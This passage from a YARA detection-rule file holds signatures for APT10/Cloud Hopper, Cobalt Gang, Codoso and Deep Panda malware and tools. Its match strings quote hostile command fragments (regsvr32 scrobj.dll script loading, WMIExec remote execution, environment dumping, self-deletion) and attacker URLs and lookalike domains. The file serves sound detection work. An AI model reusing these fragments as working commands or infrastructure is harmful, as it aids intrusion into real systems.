\"SOFTWARE\\\\EGGORG\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of them)\n}\n\nrule CloudHopper_Malware_7\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"jepsjepsjepsjepsjepsjepsjepsjepsjepsjeps\" fullword ascii\n        $x2 = \"extOextOextOextO\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule CloudHopper_Malware_8\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_8\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WSHELL32.dll\" fullword wide\n        $s2 = \"operator \\\"\\\" \" fullword ascii\n        $s3 = \"\\\" /t REG_SZ /d \\\"\" fullword wide\n        $s4 = \" /f /v \\\"\" fullword wide\n        $s5 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n        $s6 = \"AFX_DIALOG_LAYOUT\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and 4 of them)\n}\n\nrule CloudHopper_Malware_9\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_9\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"MsMpEng.exe\" fullword ascii\n        $op0 = { 2b c7 50 e8 22 83 ff ff ff b6 c0 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule CloudHopper_Malware_10\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_10\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"bakshell.EXE\" fullword wide\n        $s19 = \"bakshell Applicazione MFC\" fullword wide\n        $op0 = { 83 c4 34 c3 57 8b ce e8 92 18 00 00 68 20 70 40 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule CloudHopper_Malware_11\n{\n    meta:\n        description = \"Malware from Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_Malware_11\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"IOGVWDWCXZVRHTE\" fullword ascii\n        $op1 = { c9 c3 56 6a 00 8b f1 6a 64 e8 dd 34 00 00 c7 06 }\n        $op2 = { 68 38 00 41 00 68 34 00 41 00 e8 d3 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule CloudHopper_lockdown\n{\n    meta:\n        description = \"Tools related to Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://github.com/maaaaz/impacket-examples-windows\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_lockdown\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"lockdown.dll\" fullword ascii\n        $s3 = \"mfeann.exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule CloudHopper_WindowXarBot\n{\n    meta:\n        description = \"Malware related to Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_WindowXarBot\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\WindowXarbot.pdb\" ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule CloudHopper_WmiDLL_inMemory\n{\n    meta:\n        description = \"Malware related to Operation Cloud Hopper - Page 25\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpCloudHopper_WmiDLL_inMemory\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"wmi.dll 2>&1\" ascii\n\n    condition:\n        all of them\n}\n\nrule CloudHopper_VBS_WMIExec_Tool_Apr17_1\n{\n    meta:\n        description = \"Tools related to Operation Cloud Hopper\"\n        threat_names = \"Cloud Hopper, APT10\"\n        ref = \"https://github.com/maaaaz/impacket-examples-windows\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"VBS_WMIExec_Tool_Apr17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"strNetUse = \\\"cmd.exe /c net use \\\\\\\\\\\" & host\" fullword ascii\n        $x2 = \"localcmd = \\\"cmd.exe /c \\\" & command \" ascii\n        $x3 = \"& \\\" > \\\" & TempFile & \\\" 2>&1\\\"  '2>&1 err\" fullword ascii\n        $x4 = \"strExec = \\\"cmd.exe /c \\\" & cmd & \\\" >> \\\" & resultfile & \\\" 2>&1\\\"  '2>&1 err\" fullword ascii\n        $x5 = \"TempFile = objShell.ExpandEnvironmentStrings(\\\"%TEMP%\\\") & \\\"\\\\wmi.dll\\\"\" fullword ascii\n        $a1 = \"WMIEXEC ERROR: Command -> \" ascii\n        $a2 = \"WMIEXEC : Command result will output to\" fullword ascii\n        $a3 = \"WMIEXEC : Target ->\" fullword ascii\n        $a4 = \"WMIEXEC : Login -> OK\" fullword ascii\n        $a5 = \"WMIEXEC : Process created. PID:\" fullword ascii\n\n    condition:\n        (filesize < 40KB and 1 of them) or 3 of them\n}\n\nrule CobaltGang_CobaltStrike_CN_Group_BeaconDropper_Aug17\n{\n    meta:\n        description = \"Script Dropper of Cobalt Gang used in August 2017\"\n        threat_names = \"Cobalt Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CobaltStrike_CN_Group_BeaconDropper_Aug17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"WriteLine(\\\"(new ActiveXObject('WScript.Shell')).Run('cmd /c c:/\" ascii\n        $x2 = \"WriteLine(\\\" (new ActiveXObject('WScript.Shell')).Run('regsvr32 /s\" ascii\n        $x3 = \"sh.Run(env('cmd /c set > %temp%\" ascii\n        $x4 = \"sh.Run('regsvr32 /s /u /i:\" ascii\n        $x5 = \".Get('Win32_ScheduledJob').Create('regsvr32 /s /u /i:\" ascii\n        $x6 = \"scrobj.dll','********\" ascii\n        $x7 = \"www.thyssenkrupp-marinesystems.org\" fullword ascii\n        $x8 = \"f.WriteLine(\\\" tLnk=env('%tmp%/'+lnkName+'.lnk');\\\");\" fullword ascii\n        $x9 = \"lnkName='office 365'; \" fullword ascii\n        $x10 = \";sh=x('WScript.Shell');\" ascii\n\n    condition:\n        (filesize < 200KB and 1 of them)\n}\n\nrule CobaltGang_Malware_Aug17_1\n{\n    meta:\n        description = \"Cobalt Gang malware\"\n        threat_names = \"Cobalt Group\"\n        ref = \"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CobaltGang_Malware_Aug17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ServerSocket.EXE\" fullword wide\n        $s2 = \"Incorrect version of WS2_32.dll found\" fullword ascii\n        $s3 = \"Click 'Connect' to Connect to the Server.  'Disconnect' to disconnect from server.\" fullword wide\n        $s4 = \"Click 'Start' to start the Server.  'Stop' to Stop it.\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 3 of them)\n}\n\nrule CobaltGang_Malware_Aug17_2\n{\n    meta:\n        description = \"Cobalt Gang malware\"\n        threat_names = \"Cobalt Group\"\n        ref = \"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CobaltGang_Malware_Aug17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENGB)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and all of them)\n}\n\nrule Codoso_CustomTCP_4\n{\n    meta:\n        description = \"Codoso APT CustomTCP Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_CustomTCP_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"varus_service_x86.dll\" fullword ascii\n        $s1 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n        $s2 = \"net start %%1\" fullword ascii\n        $s3 = \"ping 127.1 > nul\" fullword ascii\n        $s4 = \"McInitMISPAlertEx\" fullword ascii\n        $s5 = \"sc start %%1\" fullword ascii\n        $s6 = \"net stop %%1\" fullword ascii\n        $s7 = \"WorkerRun\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 5 of them) or ($x1 and 2 of ($s*))\n}\n\nrule Codoso_CustomTCP_3\n{\n    meta:\n        description = \"Codoso APT CustomTCP Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_CustomTCP_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"DnsApi.dll\" fullword ascii\n        $s2 = \"softWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Domains\\\\%s\" ascii\n        $s3 = \"CONNECT %s:%d hTTP/1.1\" ascii\n        $s4 = \"CONNECT %s:%d HTTp/1.1\" ascii\n        $s5 = \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)\" ascii\n        $s6 = \"iphlpapi.dll\" ascii\n        $s7 = \"%systemroot%\\\\Web\\\\\" ascii\n        $s8 = \"Proxy-Authorization: Negotiate %s\" ascii\n        $s9 = \"CLSID\\\\{%s}\\\\InprocServer32\" ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 5 of them) or 7 of them\n}\n\nrule Codoso_CustomTCP_2\n{\n    meta:\n        description = \"Codoso APT CustomTCP Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_CustomTCP_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"varus_service_x86.dll\" fullword ascii\n        $s2 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n        $s3 = \"net start %%1\" fullword ascii\n        $s4 = \"ping 127.1 > nul\" fullword ascii\n        $s5 = \"McInitMISPAlertEx\" fullword ascii\n        $s6 = \"sc start %%1\" fullword ascii\n        $s7 = \"B_WKNDNSK^\" fullword ascii\n        $s8 = \"net stop %%1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 406KB and all of them\n}\n\nrule Codoso_PGV_PVID_6\n{\n    meta:\n        description = \"Codoso APT PGV_PVID Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PGV_PVID_6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"rundll32 \\\"%s\\\",%s\" fullword ascii\n        $s1 = \"/c ping 127.%d & del \\\"%s\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 6000KB and all of them\n}\n\nrule Codoso_CustomTCP\n{\n    meta:\n        description = \"Codoso CustomTCP Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_CustomTCP\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s4 = \"wnyglw\" fullword ascii\n        $s5 = \"WorkerRun\" fullword ascii\n        $s7 = \"boazdcd\" fullword ascii\n        $s8 = \"wayflw\" fullword ascii\n        $s9 = \"CODETABL\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 405KB and all of them\n}\n\nrule Codoso_PGV_PVID_5\n{\n    meta:\n        description = \"Codoso APT PGV PVID Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PGV_PVID_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"/c del %s >> NUL\" fullword ascii\n        $s2 = \"%s%s.manifest\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Codoso_PGV_PVID_4\n{\n    meta:\n        description = \"Codoso APT PlugX Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PGV_PVID_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"dropper, Version 1.0\" fullword wide\n        $x2 = \"dropper\" fullword wide\n        $x3 = \"DROPPER\" fullword wide\n        $x4 = \"About dropper\" fullword wide\n        $s1 = \"Microsoft Windows Manager Utility\" fullword wide\n        $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" fullword ascii\n        $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\" fullword ascii\n        $s4 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii\n        $s5 = \"<supportedOS Id=\\\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\\\"></supportedOS>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and 1 of ($x*) and 2 of ($s*)\n}\n\nrule Codoso_PGV_PVID_3\n{\n    meta:\n        description = \"Codoso APT PGV PVID Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PGV_PVID_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012\" fullword wide\n\n    condition:\n        $x1\n}\n\nrule Codoso_PGV_PVID_2\n{\n    meta:\n        description = \"Codoso APT PGV PVID Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PGV_PVID_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n        $s1 = \"regsvr32.exe /s \\\"%s\\\"\" fullword ascii\n        $s2 = \"Help and Support\" fullword ascii\n        $s3 = \"netsvcs\" fullword ascii\n        $s9 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\" fullword ascii\n        $s10 = \"winlogon\" fullword ascii\n        $s11 = \"System\\\\CurrentControlSet\\\\Services\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 907KB and all of them\n}\n\nrule Codoso_PGV_PVID_1\n{\n    meta:\n        description = \"Codoso APT PGV PVID Malware\"\n        threat_names = \"APT19, Codoso\"\n        ref = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Codoso_PGV_PVID_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Cookie: pgv_pvid=\" ascii\n        $x2 = \"DRIVERS\\\\ipinip.sys\" fullword wide\n        $s1 = \"TsWorkSpaces.dll\" fullword ascii\n        $s2 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n        $s3 = \"/selfservice/microsites/search.php?%016I64d\" fullword ascii\n        $s4 = \"/solutions/company-size/smb/index.htm?%016I64d\" fullword ascii\n        $s5 = \"Microsoft Chart ActiveX Control\" fullword wide\n        $s6 = \"MSChartCtrl.ocx\" fullword wide\n        $s7 = \"{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}\" fullword ascii\n        $s8 = \"WUServiceMain\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and (1 of ($x*) or 3 of them)) or 5 of them\n}\n\nrule DeepPanda_sl_txt_packed\n{\n    meta:\n        description = \"Anthem Hack Deep Panda - ScanLine sl-txt-packed\"\n        threat_names = \"Deep Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Anthem_DeepPanda_sl_txt_packed\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Command line port scanner\" fullword wide\n        $s1 = \"sl.exe\" fullword wide\n        $s2 = \"CPports.txt\" fullword ascii\n        $s3 = \",GET / HTTP/.}\" fullword ascii\n        $s4 = \"Foundstone Inc.\" fullword wide\n        $s9 = \" 2002 Foundstone Inc.\" fullword wide\n        $s15 = \", Inc. 2002\" fullword ascii\n        $s20 = \"ICMP Time\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule DeepPanda_lot1\n{\n    meta:\n        description = \"Anthem Hack Deep Panda - lot1.tmp-pwdump\"\n        threat_names = \"Deep Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Anthem_DeepPanda_lot1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Unable to open target process: %d, pid %d\" fullword ascii\n        $s1 = \"Couldn't delete target executable from remote machine: %d\" fullword ascii\n        $s2 = \"Target: Failed to load SAM functions.\" fullword ascii\n        $s5 = \"Error writing the test file %s, skipping this share\" fullword ascii\n        $s6 = \"Failed to create service (%s/%s), error %d\" fullword ascii\n        $s8 = \"Service start failed: %d (%s/%s)\" fullword ascii\n        $s12 = \"PwDump.exe\" fullword ascii\n        $s13 = \"GetAvailableWriteableShare returned an error of %ld\" fullword ascii\n        $s14 = \":\\\\\\\\.\\\\pipe\\\\%s\" fullword ascii\n        $s15 = \"Couldn't copy %s to destination %s. (Error %d)\" fullword ascii\n        $s16 = \"dump logon session\" fullword ascii\n        $s17 = \"Timed out waiting to get our pipe back\" fullword ascii\n        $s19 = \"SetNamedPipeHandleState failed, error %d\" fullword ascii\n        $s20 = \"%s\\\\%s.exe\" fullword ascii\n\n    condition:\n        10 of them\n}\n\nrule DeepPanda_htran_exe\n{\n    meta:\n        description = \"Anthem Hack Deep Panda - htran-exe\"\n        threat_names = \"Deep Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Anthem_DeepPanda_htran_exe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n        $s1 = \"[-] Gethostbyname(%s) error:%s\" fullword ascii\n        $s2 = \"e:\\\\VS 2008 Project\\\\htran\\\\Release\\\\htran.pdb\" fullword ascii\n        $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s5 = \"[-] ERROR: Must supply logfile name.\" fullword ascii\n        $s6 = \"[-] There is a error...Create a new connection.\" fullword ascii\n        $s7 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n        $s8 = \"======================== htran V%s =======================\" fullword ascii\n        $s9 = \"[-] Socket Listen error.\" fullword ascii\n        $s10 = \"[-] ERROR: open logfile\" fullword ascii\n        $s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s12 = \"[+] Make a Connection to %s:%d ......\" fullword ascii\n        $s14 = \"Recv %5d bytes from %s:%d\" fullword ascii\n        $s15 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n        $s16 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n        $s17 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n        $s20 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n\n    condition:\n        10 of them\n}\n\nrule DeepPanda_Trojan_Kakfum\n{\n    meta:\n        description = \"Anthem Hack Deep Panda - Trojan.Kakfum sqlsrv32.dll\"\n        threat_names = \"Deep Panda\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Anthem_DeepPanda_Trojan_Kakfum\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k sqlserver\" fullword ascii\n        $s1 = \"%s\\\\sqlsrv32.dll\" fullword ascii\n        $s2 = \"%s\\\\sqlsrv64.dll\" fullword ascii\n        $s3 = \"%s\\\\%d.tmp\" fullword ascii\n        $s4 = \"ServiceMaix\" fullword ascii\n        $s15 = \"sqlserver\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule DeepPanda_ScanBox_Malware_Generic\n{\n    meta:\n        description = \"Scanbox Chinese Deep Panda APT Malware\"\n        threat_names = \"Deep Panda\"\n        ref = \"http://goo.gl/WXUQcP, http://goo.gl/MUUfjv\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ScanBox_Malware_Generic\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://142.91.76.134/p.dat\" fullword ascii\n        $s1 = \"HttpDump 1.1\" fullword ascii\n        $s3 = \"SecureInput .exe\" fullword wide\n        $s4 = \"http://extcitrix.we11point.com/vpn/index.php?ref=1\" fullword ascii\n        $s5 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k msupdate\" fullword ascii\n        $s6 = \"ServiceMaix\" fullword ascii\n        $x1 = \"Management Support Team1\" fullword ascii\n        $x2 = \"DTOPTOOLZ Co.,Ltd.0\" fullword ascii\n        $x3 = \"SEOUL1\" fullword ascii\n\n    condition:\n        (1 of ($s*) and 2 of ($x*)) or (3 of ($x*))\n}\n\nrule DeputyDog\n{\n    meta:\n    